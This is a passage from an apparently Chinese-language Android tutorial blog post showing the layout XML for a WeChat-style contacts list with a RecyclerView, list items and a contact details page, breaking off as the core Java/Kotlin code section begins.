class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">androidx.recyclerview.widget.RecyclerView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/itemview"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginStart</span>=<span class="hljs-string">"8dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"8dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginEnd</span>=<span class="hljs-string">"8dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginBottom</span>=<span class="hljs-string">"8dp"</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>创建了一个RecyclerView，命名为itemview</p><h4 id="1-2-在fragment-txl-xml中实现每一项的信息"><a href="#1-2-在fragment-txl-xml中实现每一项的信息" class="headerlink" title="1.2 在fragment_txl.xml中实现每一项的信息"></a>1.2 在fragment_txl.xml中实现每一项的信息</h4><p><strong>效果</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/11/07/zNT4RWb9QBOnJ5a.png'><img src="https://s2.loli.net/2023/11/07/zNT4RWb9QBOnJ5a.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">"http://schemas.android.com/apk/res-auto"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/linearLayout_txl"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"15dp"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/image_touxiang"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"60dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"68dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_marginRight</span>=<span class="hljs-string">"20dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_gravity</span>=<span class="hljs-string">"left|center_vertical"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">tools:srcCompat</span>=<span class="hljs-string">"@tools:sample/avatars"</span> /&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/text_duihuakuang"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"left|center_vertical"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"TextView"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"24sp"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>用一个Linearlayout包含了一个ImageView和TextView，方便后续点击跳转</p><h4 id="1-3-实现跳转详情页面activity-txl-details-xml的内容"><a href="#1-3-实现跳转详情页面activity-txl-details-xml的内容" class="headerlink" title="1.3 实现跳转详情页面activity_txl_details.xml的内容"></a><strong>1.3 实现跳转详情页面activity_txl_details.xml的内容</strong></h4><p><strong>效果</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/11/07/2x7VMdsqJFDzOPL.png'><img src="https://s2.loli.net/2023/11/07/2x7VMdsqJFDzOPL.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">"http://schemas.android.com/apk/res-auto"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">".txlDetails"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/WeChatname"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"名字"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.008"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.275"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/linearLayout"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"411dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"horizontal"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/linearLayout2"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"411dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"horizontal"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/linearLayout3"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"411dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"horizontal"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/linearLayout4"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"411dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"horizontal"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/returnButton"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"408dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"返回"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">"@+id/imageDetail"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:layout_editor_absoluteX</span>=<span class="hljs-string">"146dp"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/wxtag"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"24dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"标签"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">"@+id/region"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:layout_editor_absoluteX</span>=<span class="hljs-string">"5dp"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/wxtag2"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginStart</span>=<span class="hljs-string">"188dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"未分类"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.441"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">"@+id/wxtag"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.611"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/region"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"141dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"24dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"地区"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">"@+id/phoneNumber"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:layout_editor_absoluteX</span>=<span class="hljs-string">"5dp"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/region2"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"未知"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.773"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">"@+id/region"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.501"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/imageDetail"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"154dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"121dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.498"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.042"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:srcCompat</span>=<span class="hljs-string">"@tools:sample/avatars"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/phoneNumber"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginTop</span>=<span class="hljs-string">"28dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"电话号码"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toBottomOf</span>=<span class="hljs-string">"@+id/WeChatname"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">tools:layout_editor_absoluteX</span>=<span class="hljs-string">"0dp"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/phone"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginStart</span>=<span class="hljs-string">"36dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"11111111111"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.058"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">"@+id/phoneNumber"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.388"</span> /&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/textDetail"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_marginStart</span>=<span class="hljs-string">"152dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"3"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"微信昵称"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textStyle</span>=<span class="hljs-string">"bold"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintHorizontal_bias</span>=<span class="hljs-string">"0.0"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toEndOf</span>=<span class="hljs-string">"@+id/WeChatname"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintVertical_bias</span>=<span class="hljs-string">"0.275"</span> /&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>设置了一些基础信息</p><h3 id="2-核心代码实现"><a href="#2-核心代码实现" class="headerlink" title="2. 核心代码实现"></a>2. 核心代码实现</h3><h4 id="2-1-在txlFragment里面实现了初始化操作，并生成数据数组，创建RecycleView实例和设置Adapter"><a href="#2-1-在txlFragment里面实现了初始化操作，并生成数据数组，创建RecycleView实例和设置Adapter" class="headerlink" title="2.1 在txlFragment里面实现了初始化操作，并生成数据数组，创建RecycleView实例和设置Adapter"></a>2.1 在txlFragment里面实现了初始化操作，并生成数据数组，创建RecycleView实例和设置Adapter</h4><p><strong>代码</strong></p><figure class="highlight 